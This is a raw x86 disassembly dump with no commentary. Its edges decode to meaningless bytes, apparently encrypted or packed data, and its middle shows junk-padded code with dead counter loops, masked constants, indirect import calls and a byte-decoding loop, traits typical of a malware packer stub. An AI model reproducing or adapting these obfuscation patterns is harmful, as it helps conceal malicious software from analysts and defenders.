  40efe6:	jne    0x40efee
  40efe8:	(bad)  
  40efea:	push   edi
  40efeb:	rol    BYTE PTR [edi-0x3b0361be],1
  40eff1:	out    dx,al
  40eff2:	fist   WORD PTR [edi]
  40eff4:	sub    bl,BYTE PTR [eax+0x0]
  40eff7:	sar    DWORD PTR [edi+0x7b],cl
  40effa:	mov    WORD PTR [edx+0x79e3a192],?
  40f000:	adc    al,0x9a
  40f002:	out    dx,al
  40f003:	loopne 0x40efca
  40f005:	mov    eax,0xca627ed5
  40f00a:	lock rcl ah,1
  40f00d:	dec    edx
  40f00e:	jecxz  0x40efb0
  40f010:	mov    dh,bl
  40f012:	in     al,0x96
  40f014:	push   es
  40f015:	mov    al,ds:0x2693fc33
  40f01a:	mov    edx,0x701b857e
  40f01f:	push   ecx
  40f020:	add    ah,al
  40f022:	push   es
  40f023:	div    DWORD PTR [ebx]
  40f025:	mov    ebx,0x8ba2def
  40f02a:	and    edi,DWORD PTR [edi+0x1d8722c8]
  40f030:	mov    bh,0x83
  40f032:	lock xor eax,0x97a99d44
  40f038:	ins    BYTE PTR es:[edi],dx
  40f039:	inc    ebp
  40f03a:	mov    ecx,fs
  40f03c:	imul   eax,DWORD PTR [ebx],0x15
  40f03f:	je     0x40f0b3
  40f041:	loope  0x40f051
  40f043:	push   edx
  40f044:	push   edx
  40f045:	jb     0x40f045
  40f047:	dec    esi
  40f048:	ret    
  40f049:	fdivr  DWORD PTR [ebx-0x45]
  40f04c:	mov    ebp,0x70e58910
  40f051:	and    esi,ebx
  40f053:	pop    ds
  40f054:	(bad)  
  40f055:	iret   
  40f056:	cmp    BYTE PTR [esi+0x3c],cl
  40f059:	fsubp  st(0),st
  40f05b:	mov    WORD PTR [ecx+0x4275f0b1],es
  40f061:	pop    ds
  40f062:	inc    ebp
  40f063:	es or  al,0xb4
  40f066:	pop    es
  40f067:	add    eax,DWORD PTR [edx+0x13]
  40f06a:	ja     0x40f068
  40f06c:	pop    ebp
  40f06d:	lods   al,BYTE PTR fs:[esi]
  40f06f:	jmp    0x4db3:0x5b0637ba
  40f076:	xor    al,0xc1
  40f078:	retf   
  40f079:	pop    edx
  40f07a:	xor    eax,0x6bb27b4c
  40f07f:	pop    ebp
  40f080:	inc    edi
  40f081:	adc    al,0x45
  40f083:	dec    ebp
  40f084:	push   0x65
  40f086:	adc    esp,ebx
  40f088:	clc    
  40f089:	push   eax
  40f08a:	int    0xb3
  40f08c:	add    eax,0xe40b8115
  40f091:	pop    ecx
  40f092:	clc    
  40f093:	xchg   ecx,eax
  40f094:	mov    eax,0xa20ff495
  40f099:	xor    dh,BYTE PTR ds:0x11b0ee6a
  40f09f:	adc    BYTE PTR [esi+0x795d108f],bl
  40f0a5:	outs   dx,DWORD PTR ds:[esi]
  40f0a6:	push   edx
  40f0a7:	sbb    cl,BYTE PTR [ebx-0x16]
  40f0aa:	or     BYTE PTR [esi-0x1e],0x4d
  40f0ae:	pop    edi
  40f0af:	add    al,0xd4
  40f0b1:	call   0xb2ab:0x10ee3209
  40f0b8:	stc    
  40f0b9:	cmc    
  40f0ba:	repz dec ebp
  40f0bc:	ds mov al,0x30
  40f0bf:	dec    edx
  40f0c0:	sub    edx,edi
  40f0c2:	daa    
  40f0c3:	mov    bl,0xf2
  40f0c5:	mov    bl,0xd1
  40f0c7:	packssdw mm5,QWORD PTR [ecx]
  40f0ca:	inc    eax
  40f0cb:	inc    DWORD PTR [ecx-0xe2a90ac]
  40f0d1:	jae    0x1d184813
  40f0d7:	mov    dl,0x23
  40f0d9:	pop    ds
  40f0da:	push   0xdb71b463
  40f0df:	or     edi,edx
  40f0e1:	add    eax,0x56b53d05
  40f0e6:	(bad)  [esp+eax*2+0x6e]
  40f0ea:	out    0xa8,eax
  40f0ec:	xor    al,0xc5
  40f0ee:	mov    DWORD PTR [ecx+0x2fa9a5d6],ecx
  40f0f4:	xor    BYTE PTR [ebp+0x37],cl
  40f0f7:	push   ebx
  40f0f8:	(bad)  [edi]
  40f0fa:	fwait
  40f0fb:	into   
  40f0fc:	int    0x8f
  40f0fe:	xor    eax,0x4fdcea06
  40f103:	imul   ebp,DWORD PTR [ebx+ebp*1+0x37],0x6c
  40f108:	stos   BYTE PTR es:[edi],al
  40f109:	fsubr  st(6),st
  40f10b:	lahf   
  40f10c:	out    dx,al
  40f10d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10e:	pop    ebx
  40f10f:	retf   
  40f110:	cmp    al,0x4
  40f112:	pop    edx
  40f113:	xchg   edi,eax
  40f114:	cs in  al,0x15
  40f117:	shr    esp,0x44
  40f11a:	in     eax,dx
  40f11b:	adc    edx,ecx
  40f11d:	cs aad 0x15
  40f120:	or     ch,BYTE PTR [ebp-0x394a8263]
  40f126:	mov    ebx,0xd8654870
  40f12b:	xor    eax,0x53d42dac
  40f130:	add    ah,0xee
  40f133:	dec    edi
  40f134:	mov    ds,WORD PTR [eax]
  40f136:	idiv   DWORD PTR [edi]
  40f138:	lods   eax,DWORD PTR ds:[esi]
  40f139:	inc    esi
  40f13a:	adc    DWORD PTR [edi+0xc758bac],0x458bf03b
  40f144:	cld    
  40f145:	je     0x40cd96
  40f14b:	xor    eax,edx
  40f14d:	add    eax,ecx
  40f14f:	mov    ecx,DWORD PTR [ebp+0xc]
  40f152:	imul   eax,ecx
  40f155:	add    eax,DWORD PTR [ebp+0x8]
  40f158:	mov    DWORD PTR [ebp+0xc],eax
  40f15b:	mov    eax,DWORD PTR [ebp+0xc]
  40f15e:	pop    esi
  40f15f:	leave  
  40f160:	ret    0x8
  40f163:	push   ebp
  40f164:	mov    ebp,esp
  40f166:	push   ecx
  40f167:	or     eax,0x63ef
  40f16c:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  40f173:	adc    DWORD PTR ds:0x429004,0x1463
  40f17d:	mov    eax,DWORD PTR [ebp-0x4]
  40f180:	mov    edx,DWORD PTR [ebp+0x10]
  40f183:	mov    ecx,DWORD PTR ds:0x42b010
  40f189:	add    DWORD PTR ds:0x42a000,ecx
  40f18f:	mov    ecx,0x7510896
  40f194:	neg    DWORD PTR ds:0x42b010
  40f19a:	xor    eax,ecx
  40f19c:	add    eax,0x3272dd
  40f1a1:	and    DWORD PTR ds:0x429010,0xb4c
  40f1ab:	mov    DWORD PTR [edx],eax
  40f1ad:	and    DWORD PTR ds:0x42c01c,0x0
  40f1b7:	jmp    0x40f1c9
  40f1bc:	mov    edx,DWORD PTR ds:0x42c01c
  40f1c2:	inc    edx
  40f1c3:	mov    DWORD PTR ds:0x42c01c,edx
  40f1c9:	cmp    DWORD PTR ds:0x42c01c,0x1b
  40f1d0:	jae    0x40f1f8
  40f1d6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f1dd:	jne    0x40f1f3
  40f1e3:	push   0x22f2
  40f1e8:	push   0x42e134
  40f1ed:	call   DWORD PTR ds:0x42ed5d
  40f1f3:	jmp    0x40f1bc
  40f1f8:	mov    eax,DWORD PTR [ebp+0xc]
  40f1fb:	or     DWORD PTR ds:0x42a004,ecx
  40f201:	xor    eax,ecx
  40f203:	push   esi
  40f204:	mov    esi,DWORD PTR [ebp+0x10]
  40f207:	mov    edx,0x3272dd
  40f20c:	add    eax,edx
  40f20e:	mov    DWORD PTR [esi+0x4],eax
  40f211:	mov    eax,DWORD PTR [ebp+0x14]
  40f214:	mov    esi,DWORD PTR [ebp+0x10]
  40f217:	mov    DWORD PTR [esi+0x8],eax
  40f21a:	mov    eax,DWORD PTR [ebp+0x18]
  40f21d:	mov    esi,DWORD PTR [ebp+0x10]
  40f220:	mov    DWORD PTR [esi+0xc],eax
  40f223:	mov    eax,DWORD PTR [ebp+0x1c]
  40f226:	mov    esi,DWORD PTR [ebp+0x10]
  40f229:	mov    DWORD PTR [esi+0x10],eax
  40f22c:	mov    eax,DWORD PTR [ebp+0x8]
  40f22f:	xor    eax,ecx
  40f231:	add    eax,edx
  40f233:	pop    esi
  40f234:	leave  
  40f235:	ret    0x18
  40f238:	push   ebp
  40f239:	mov    ebp,esp
  40f23b:	sub    esp,0xa4
  40f241:	adc    eax,0x77b8
  40f246:	mov    ecx,DWORD PTR [ebp+0x8]
  40f249:	adc    DWORD PTR ds:0x429000,edi
  40f24f:	mov    eax,0x8a89
  40f254:	adc    DWORD PTR ds:0x42900c,0x429028
  40f25e:	xor    ax,WORD PTR [ecx+0x20]
  40f262:	mov    ecx,DWORD PTR ds:0x429028
  40f268:	and    DWORD PTR ds:0x42b00c,ecx
  40f26e:	mov    ecx,0x3b4c
  40f273:	dec    DWORD PTR ds:0x42d014
  40f279:	add    ax,cx
  40f27c:	movzx  eax,ax
  40f27f:	add    ecx,0x1468
  40f285:	mov    DWORD PTR [ebp-0x18],eax
  40f288:	mov    BYTE PTR [ebp-0x1],0x7d
  40f28c:	mov    ecx,DWORD PTR ds:0x412000
  40f292:	mov    ecx,DWORD PTR [ecx]
  40f294:	adc    DWORD PTR ds:0x42d01c,ecx
  40f29a:	lea    eax,[ebp-0x1]
  40f29d:	sub    DWORD PTR ds:0x42c014,0xae5
  40f2a7:	mov    DWORD PTR [ebp-0x10],eax
  40f2aa:	mov    al,BYTE PTR [ebp-0x1]
  40f2ad:	inc    ecx
  40f2ae:	mov    ecx,DWORD PTR [ebp-0x10]
  40f2b1:	xor    al,0x71
  40f2b3:	adc    DWORD PTR ds:0x42b018,0x264
  40f2bd:	sub    al,0xb
  40f2bf:	adc    DWORD PTR ds:0x429014,0x5cc7
  40f2c9:	mov    BYTE PTR [ecx],al
  40f2cb:	mov    DWORD PTR ds:0x42b004,0x11
  40f2d5:	cmp    DWORD PTR ds:0x42b004,0x0
  40f2dc:	je     0x40f31e
  40f2e2:	cmp    DWORD PTR ds:0x42b004,0x1d
  40f2e9:	jne    0x40f304
  40f2ef:	push   0x42e000
  40f2f4:	push   DWORD PTR [ebp-0x18]
  40f2f7:	push   0x0
  40f2f9:	push   0x4fbc
  40f2fe:	call   DWORD PTR ds:0x42ed61
  40f304:	mov    eax,ds:0x42b004
  40f309:	dec    eax
  40f30a:	mov    ds:0x42b004,eax
  40f30f:	jmp    0x40f2d5
  40f314:	sbb    DWORD PTR ds:0x42d010,0x7483
  40f31e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40f325:	push   ebx
  40f326:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  40f32d:	mov    ecx,DWORD PTR [ebp-0x14]
  40f330:	push   esi
  40f331:	and    DWORD PTR ds:0x42a01c,0x0
  40f33b:	jmp    0x40f34d
  40f340:	mov    esi,DWORD PTR ds:0x42a01c
  40f346:	inc    esi
  40f347:	mov    DWORD PTR ds:0x42a01c,esi
  40f34d:	cmp    DWORD PTR ds:0x42a01c,0x1f
  40f354:	jae    0x40f3f6
  40f35a:	cmp    DWORD PTR ds:0x42a01c,0x21
  40f361:	jne    0x40f377
  40f367:	push   0x42c010
  40f36c:	push   0x562e
  40f371:	call   DWORD PTR ds:0x42ed65
  40f377:	jmp    0x40f340
  40f37c:	and    DWORD PTR ds:0x42d01c,0x0
  40f386:	xor    eax,eax
  40f388:	or     eax,DWORD PTR ds:0x42d01c
  40f38e:	inc    eax
  40f38f:	mov    ds:0x42d01c,eax
  40f394:	cmp    DWORD PTR ds:0x42d01c,0xb
  40f39b:	jne    0x40f3c1
  40f3a1:	push   DWORD PTR [ebp-0x24]
  40f3a4:	push   0x42a010
  40f3a9:	push   0x78c6
  40f3ae:	push   0x42e134
  40f3b3:	push   DWORD PTR [ebp-0x1c]
  40f3b6:	push   0x1e85
  40f3bb:	call   DWORD PTR ds:0x42ed6d
  40f3c1:	cmp    DWORD PTR ds:0x42d01c,0xa
  40f3c8:	jne    0x40f3d9
  40f3ce:	mov    eax,ds:0x42d01c
  40f3d3:	inc    eax
  40f3d4:	mov    ds:0x42d01c,eax
  40f3d9:	cmp    DWORD PTR ds:0x42d01c,0x18
  40f3e0:	jb     0x40f386
  40f3e6:	xor    eax,eax
  40f3e8:	xor    eax,DWORD PTR ds:0x411ff4
  40f3ee:	mov    eax,DWORD PTR [eax]
  40f3f0:	or     DWORD PTR ds:0x42b018,eax
  40f3f6:	mov    eax,0x7510896
  40f3fb:	sbb    DWORD PTR ds:0x42a01c,edx
  40f401:	xor    ecx,eax
  40f403:	or     esi,DWORD PTR ds:0x42a008
  40f409:	mov    esi,0x3272dd
  40f40e:	push   edi
  40f40f:	add    ecx,esi
  40f411:	jmp    0x40f435
  40f416:	mov    DWORD PTR ds:0x42a01c,0x2feb
  40f420:	mov    dl,BYTE PTR [ebp-0x1]
  40f423:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40f42a:	mov    DWORD PTR ds:0x42b01c,0x5ed5
  40f434:	inc    ecx
  40f435:	cmp    ecx,0x40
  40f438:	jb     0x40f416
  40f43e:	mov    DWORD PTR ds:0x429018,0x19
  40f448:	cmp    DWORD PTR ds:0x429018,0x0
  40f44f:	je     0x40f47c
  40f455:	cmp    DWORD PTR ds:0x429018,0x1d
  40f45c:	jne    0x40f468
  40f462:	call   DWORD PTR ds:0x42ed71
  40f468:	mov    edx,DWORD PTR ds:0x429018
  40f46e:	dec    edx
  40f46f:	mov    DWORD PTR ds:0x429018,edx
  40f475:	jmp    0x40f448
  40f47a:	not    edx
  40f47c:	mov    edx,DWORD PTR [ebp-0x14]
  40f47f:	sub    DWORD PTR ds:0x42c00c,0x42b014
  40f489:	xor    edx,eax
  40f48b:	adc    DWORD PTR ds:0x429024,0x42a018
  40f495:	add    edx,esi
  40f497:	mov    DWORD PTR ds:0x42b014,0x72c9
  40f4a1:	jmp    0x40f5bb
  40f4a6:	dec    DWORD PTR ds:0x429014
  40f4ac:	mov    edi,DWORD PTR [ebp+0x8]
  40f4af:	adc    ecx,DWORD PTR ds:0x42a018
  40f4b5:	mov    ecx,0x8a89
  40f4ba:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f4bf:	and    DWORD PTR ds:0x429008,0x0
  40f4c9:	jmp    0x40f4dd
  40f4ce:	xor    edi,edi
  40f4d0:	xor    edi,DWORD PTR ds:0x429008
  40f4d6:	inc    edi
  40f4d7:	mov    DWORD PTR ds:0x429008,edi
  40f4dd:	cmp    DWORD PTR ds:0x429008,0x10
  40f4e4:	jae    0x40f511
  40f4ea:	cmp    DWORD PTR ds:0x429008,0x19
  40f4f1:	jne    0x40f502
  40f4f7:	push   0x429018
  40f4fc:	call   DWORD PTR ds:0x42ed75
  40f502:	jmp    0x40f4ce
  40f507:	adc    DWORD PTR ds:0x42a010,0x20e4
  40f511:	mov    edi,0x3b4c
  40f516:	sub    DWORD PTR ds:0x42a014,0x7a80
  40f520:	add    cx,di
  40f523:	movzx  ecx,cx
  40f526:	neg    DWORD PTR ds:0x42b000
  40f52c:	mov    DWORD PTR [ebp-0x10],ecx
  40f52f:	and    DWORD PTR ds:0x42a000,0x0
  40f539:	jmp    0x40f54b
  40f53e:	mov    ecx,DWORD PTR ds:0x42a000
  40f544:	inc    ecx
  40f545:	mov    DWORD PTR ds:0x42a000,ecx
  40f54b:	cmp    DWORD PTR ds:0x42a000,0x1f
  40f552:	jae    0x40f57e
  40f558:	cmp    DWORD PTR ds:0x42a000,0x26
  40f55f:	jne    0x40f573
  40f565:	push   0x3463
  40f56a:	push   DWORD PTR [ebp-0x1c]
  40f56d:	call   DWORD PTR ds:0x42ed35
  40f573:	jmp    0x40f53e
  40f578:	or     ecx,0x6b07
  40f57e:	mov    ecx,DWORD PTR [ebp+0x8]
  40f581:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f585:	mov    DWORD PTR ds:0x42a010,0x2266
  40f58f:	xor    ecx,0x8a89
  40f595:	add    ecx,edi
  40f597:	mov    DWORD PTR ds:0x42b018,0x196a
  40f5a1:	mov    edi,DWORD PTR [ebp-0x10]
  40f5a4:	mov    DWORD PTR ds:0x42a018,0x15ce
  40f5ae:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40f5b5:	mov    ecx,0x651b
  40f5ba:	inc    edx
  40f5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5be:	mov    DWORD PTR ds:0x429020,0x7b55
  40f5c8:	cmp    edx,ecx
  40f5ca:	jne    0x40f4a6
  40f5d0:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5d3:	mov    edx,DWORD PTR [ebp+0x10]
  40f5d6:	adc    DWORD PTR ds:0x429008,0x429014
  40f5e0:	xor    ecx,eax
  40f5e2:	mov    DWORD PTR ds:0x429028,0x35c1
  40f5ec:	add    ecx,esi
  40f5ee:	sub    DWORD PTR ds:0x429024,0xd80
  40f5f8:	mov    DWORD PTR [edx],ecx
  40f5fa:	add    ecx,0x553e
  40f600:	mov    ecx,DWORD PTR [ebp-0x14]
  40f603:	add    DWORD PTR ds:0x42901c,0xd2d
  40f60d:	xor    ecx,eax
  40f60f:	add    ecx,esi
  40f611:	mov    DWORD PTR ds:0x42d008,0x74bc
  40f61b:	mov    DWORD PTR [ebp-0x20],ecx
  40f61e:	mov    DWORD PTR ds:0x42a004,edi
  40f624:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  40f62b:	mov    DWORD PTR ds:0x429018,0x1d37
  40f635:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  40f63c:	mov    DWORD PTR ds:0x42901c,0x14b9
  40f646:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  40f64d:	mov    DWORD PTR ds:0x42c000,edx
  40f653:	mov    ecx,DWORD PTR [ebp-0xc]
  40f656:	mov    DWORD PTR ds:0x42a018,0x1347
  40f660:	mov    DWORD PTR [ebp+0x8],ecx
  40f663:	mov    DWORD PTR ds:0x429014,0x4ea
  40f66d:	jmp    0x40f78d
  40f672:	sbb    DWORD PTR ds:0x42a018,0x42c008
  40f67c:	mov    ecx,DWORD PTR [ebp+0x8]
  40f67f:	and    edx,DWORD PTR ds:0x42c00c
  40f685:	mov    edx,DWORD PTR [ebp-0x8]
  40f688:	xor    DWORD PTR ds:0x42a008,0x42a018
  40f692:	xor    ecx,eax
  40f694:	xor    edx,eax
  40f696:	sub    ecx,edx
  40f698:	sub    edx,0x6561
  40f69e:	sub    ecx,esi
  40f6a0:	xor    ecx,eax
  40f6a2:	mov    DWORD PTR [ebp+0x8],ecx
  40f6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6a8:	mov    edx,DWORD PTR [ebp-0x64]
  40f6ab:	sub    DWORD PTR ds:0x42901c,0x6b48
  40f6b5:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6bc:	movzx  edx,WORD PTR ds:0x42900c
  40f6c3:	adc    DWORD PTR ds:0x42c00c,edx
  40f6c9:	mov    DWORD PTR [ebp-0x64],ecx
  40f6cc:	sbb    DWORD PTR ds:0x42a018,0x1891
  40f6d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6d9:	dec    edx
  40f6da:	mov    edx,DWORD PTR [ebp-0x60]
  40f6dd:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6e4:	mov    DWORD PTR [ebp-0x60],ecx
  40f6e7:	sbb    DWORD PTR ds:0x42900c,0x79ab
  40f6f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6f4:	add    DWORD PTR ds:0x42a01c,edi
  40f6fa:	mov    edx,DWORD PTR [ebp-0x5c]
  40f6fd:	lea    ecx,[edx+ecx*1+0x5708f3]
  40f704:	mov    DWORD PTR [ebp-0x5c],ecx
  40f707:	inc    DWORD PTR ds:0x429004
  40f70d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f710:	sbb    DWORD PTR ds:0x42d018,edx
  40f716:	mov    edx,DWORD PTR [ebp-0x58]
  40f719:	and    DWORD PTR ds:0x42c008,0x42b004
  40f723:	lea    ecx,[edx+ecx*1+0x5708f0]
  40f72a:	dec    edx
  40f72b:	mov    DWORD PTR [ebp-0x58],ecx
  40f72e:	movzx  ecx,WORD PTR ds:0x429000
  40f735:	adc    DWORD PTR ds:0x42c008,ecx
  40f73b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f73e:	mov    edx,DWORD PTR [ebp-0x54]
  40f741:	add    DWORD PTR ds:0x42d004,0x42a014
  40f74b:	lea    ecx,[edx+ecx*1+0x5708f1]
  40f752:	mov    DWORD PTR [ebp-0x54],ecx
  40f755:	xor    DWORD PTR ds:0x42d01c,0x80b
  40f75f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f762:	and    DWORD PTR ds:0x42d008,0x7467
  40f76c:	mov    edx,DWORD PTR [ebp-0x50]
  40f76f:	or     DWORD PTR ds:0x42c004,0x42a000
  40f779:	lea    ecx,[edx+ecx*1+0x5708fe]
  40f780:	add    DWORD PTR ds:0x42c010,0x5221
  40f78a:	mov    DWORD PTR [ebp-0x50],ecx
  40f78d:	or     ecx,DWORD PTR ds:0x429028
  40f793:	mov    ecx,DWORD PTR [ebp+0x8]
  40f796:	xor    ecx,eax
  40f798:	add    ecx,esi
  40f79a:	mov    DWORD PTR ds:0x42c004,0x633d
  40f7a4:	jne    0x40f672
  40f7aa:	jmp    0x411e4d
  40f7af:	neg    DWORD PTR ds:0x42901c
  40f7b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7b8:	mov    edx,DWORD PTR [ebp-0x8]
  40f7bb:	sub    DWORD PTR ds:0x429008,0x429014
  40f7c5:	xor    ecx,eax
  40f7c7:	xor    edx,eax
  40f7c9:	sbb    DWORD PTR ds:0x42c018,0x25ac
  40f7d3:	sub    ecx,edx
  40f7d5:	or     DWORD PTR ds:0x42d000,0x429014
  40f7df:	sub    ecx,esi
  40f7e1:	xor    ecx,eax
  40f7e3:	mov    DWORD PTR ds:0x42b018,0x1de
  40f7ed:	mov    DWORD PTR [ebp-0x1c],ecx
  40f7f0:	mov    DWORD PTR ds:0x42c000,0x7d6a
  40f7fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40f7fd:	mov    DWORD PTR ds:0x429028,0x9e0
  40f807:	mov    DWORD PTR [ebp+0x8],ecx
  40f80a:	jmp    0x40f91d
  40f80f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f812:	mov    edx,DWORD PTR [ebp-0x8]
  40f815:	xor    ecx,eax
  40f817:	adc    DWORD PTR ds:0x42c008,ecx
  40f81d:	xor    edx,eax
  40f81f:	xor    DWORD PTR ds:0x42900c,0x3273
  40f829:	sub    ecx,edx
  40f82b:	sub    ecx,esi
  40f82d:	or     edi,edi
  40f82f:	xor    ecx,eax
  40f831:	mov    DWORD PTR [ebp+0x8],ecx
  40f834:	and    DWORD PTR ds:0x429020,0x0
  40f83e:	jmp    0x40f850
  40f843:	mov    edi,DWORD PTR ds:0x429020
  40f849:	inc    edi
  40f84a:	mov    DWORD PTR ds:0x429020,edi
  40f850:	cmp    DWORD PTR ds:0x429020,0x1b
  40f857:	jae    0x40f8a8
  40f85d:	cmp    DWORD PTR ds:0x429020,0x6
  40f864:	jne    0x40f87f
  40f86a:	push   0x6ce2
  40f86f:	push   0x42d018
  40f874:	push   0x18a6
  40f879:	call   DWORD PTR ds:0x42ed39
  40f87f:	cmp    DWORD PTR ds:0x429020,0x5
  40f886:	jne    0x40f899
  40f88c:	mov    edi,DWORD PTR ds:0x429020
  40f892:	inc    edi
  40f893:	mov    DWORD PTR ds:0x429020,edi
  40f899:	jmp    0x40f843
  40f89e:	and    DWORD PTR ds:0x42b004,0x42b01c
  40f8a8:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ab:	mov    edx,DWORD PTR [ebp+0x8]
  40f8ae:	and    DWORD PTR ds:0x42d010,0x0
  40f8b8:	mov    edi,DWORD PTR ds:0x42d010
  40f8be:	inc    edi
  40f8bf:	mov    DWORD PTR ds:0x42d010,edi
  40f8c5:	cmp    DWORD PTR ds:0x42d010,0x5
  40f8cc:	jne    0x40f8e2
  40f8d2:	push   0x42e11d
  40f8d7:	push   0x42e110
  40f8dc:	call   DWORD PTR ds:0x42ed3d
  40f8e2:	cmp    DWORD PTR ds:0x42d010,0x4
  40f8e9:	jne    0x40f8fc
  40f8ef:	mov    edi,DWORD PTR ds:0x42d010
  40f8f5:	inc    edi
  40f8f6:	mov    DWORD PTR ds:0x42d010,edi
  40f8fc:	cmp    DWORD PTR ds:0x42d010,0x15
  40f903:	jb     0x40f8b8
  40f909:	imul   edx,edx,0x5708f2
  40f90f:	xor    ecx,eax
  40f911:	add    ecx,esi
  40f913:	lea    ecx,[ebp+ecx*4-0x64]
  40f917:	mov    edi,DWORD PTR [ecx]
  40f919:	add    edx,edi
  40f91b:	mov    DWORD PTR [ecx],edx
  40f91d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f920:	xor    ecx,eax
  40f922:	add    ecx,esi
  40f924:	jne    0x40f80f
  40f92a:	mov    ecx,DWORD PTR [ebp-0x20]
  40f92d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f934:	mov    dl,BYTE PTR [ebp-0x1]
  40f937:	cmp    cl,dl
  40f939:	je     0x411dae
  40f93f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f942:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f949:	mov    edx,DWORD PTR [ebp+0xc]
  40f94c:	cmp    cl,BYTE PTR [edx]
  40f94e:	jne    0x411e5f
  40f954:	mov    ecx,DWORD PTR [ebp-0x14]
  40f957:	mov    edx,DWORD PTR [ebp+0xc]
  40f95a:	movsx  edx,BYTE PTR [edx]
  40f95d:	xor    ecx,eax
  40f95f:	add    ecx,esi
  40f961:	cmp    edx,ecx
  40f963:	mov    ecx,DWORD PTR [ebp-0xc]
  40f966:	mov    DWORD PTR [ebp+0x8],ecx
  40f969:	mov    ecx,DWORD PTR [ebp+0x8]
  40f96c:	je     0x411ed9
  40f972:	jmp    0x40f9a7
  40f977:	mov    ecx,DWORD PTR [ebp+0x8]
  40f97a:	mov    edx,DWORD PTR [ebp-0x8]
  40f97d:	xor    ecx,eax
  40f97f:	xor    edx,eax
  40f981:	sub    ecx,edx
  40f983:	sub    ecx,esi
  40f985:	xor    ecx,eax
  40f987:	mov    DWORD PTR [ebp+0x8],ecx
  40f98a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f98d:	mov    edx,DWORD PTR [ebp+0x8]
  40f990:	xor    ecx,eax
  40f992:	imul   edx,edx,0x5708f2
  40f998:	add    ecx,esi
  40f99a:	lea    ecx,[ebp+ecx*4-0x64]
  40f99e:	mov    edi,DWORD PTR [ecx]
  40f9a0:	add    edx,edi
  40f9a2:	mov    DWORD PTR [ecx],edx
  40f9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9a7:	xor    ecx,eax
  40f9a9:	add    ecx,esi
  40f9ab:	jne    0x40f977
  40f9b1:	mov    ecx,DWORD PTR [ebp-0x14]
  40f9b4:	mov    edx,DWORD PTR [ebp+0x8]
  40f9b7:	xor    ecx,eax
  40f9b9:	xor    edx,eax
  40f9bb:	add    ecx,esi
  40f9bd:	add    edx,esi
  40f9bf:	cmp    ecx,edx
  40f9c1:	jae    0x411df3
  40f9c7:	lea    edx,[ecx-0x3272dd]
  40f9cd:	mov    DWORD PTR [ebp-0x18],edx
  40f9d0:	mov    edi,DWORD PTR [ebp-0x18]
  40f9d3:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  40f9da:	lea    edx,[ebp-0x24]
  40f9dd:	mov    DWORD PTR [ebp-0x10],edx
  40f9e0:	mov    edx,DWORD PTR [ebp-0x10]
  40f9e3:	add    DWORD PTR [edx],0x705fa0f
  40f9e9:	mov    ebx,DWORD PTR [ebp-0x10]
  40f9ec:	xor    edi,eax
  40f9ee:	add    edi,DWORD PTR [ebx]
  40f9f0:	lea    edx,[ebp+ecx*4-0x64]
  40f9f4:	mov    ebx,DWORD PTR [edx]
  40f9f6:	xor    edi,ebx
  40f9f8:	mov    DWORD PTR [edx],edi
  40f9fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f9fd:	xor    edx,eax
  40f9ff:	inc    ecx
  40fa00:	inc    DWORD PTR [ebp-0x18]
  40fa03:	add    edx,esi
  40fa05:	jmp    0x411da1
  40fa0a:	fstp   DWORD PTR [ebx]
  40fa0c:	sti    
  40fa0d:	sar    DWORD PTR [ebx-0x4f],1
  40fa10:	jnp    0x40fa2d
  40fa12:	inc    esi
  40fa13:	xchg   ebx,eax
  40fa14:	or     ch,BYTE PTR [eax]
  40fa16:	dec    esp
  40fa17:	jns    0x40fa92
  40fa19:	out    dx,al
  40fa1a:	je     0x40f9e6
  40fa1c:	jp     0x40fa98
  40fa1e:	sti    
  40fa1f:	pop    edi
  40fa20:	jp     0x40fa9c
  40fa22:	lods   al,BYTE PTR ds:[esi]
  40fa23:	push   cs
  40fa24:	xchg   esi,eax
  40fa25:	adc    eax,0x7d301f4a
  40fa2a:	jnp    0x40fa2b
  40fa2c:	shl    BYTE PTR [esi-0x60],cl
  40fa2f:	adc    BYTE PTR [edx+0x2b171ea8],0x25
  40fa36:	aam    0x40
  40fa38:	add    al,0xeb
  40fa3a:	and    al,0x98
  40fa3c:	and    ebp,DWORD PTR [edx-0x2]
  40fa3f:	adc    al,0xae
  40fa41:	cmp    cl,BYTE PTR [edx-0x2f]
  40fa44:	push   es
  40fa45:	mov    ecx,0x503b1680
  40fa4a:	(bad)  
  40fa4b:	push   ss
  40fa4c:	rcl    bl,cl
  40fa4e:	pop    ebx
  40fa4f:	lahf   
  40fa50:	lods   eax,DWORD PTR ds:[esi]
  40fa51:	sar    DWORD PTR [edi-0x9542b51],0x7
  40fa58:	je     0x40fa78
  40fa5a:	clc    
  40fa5b:	ins    DWORD PTR es:[edi],dx
  40fa5c:	adc    ebp,edx
  40fa5e:	jno    0x40fa2b
  40fa60:	mov    ds:0xaabcebc7,eax
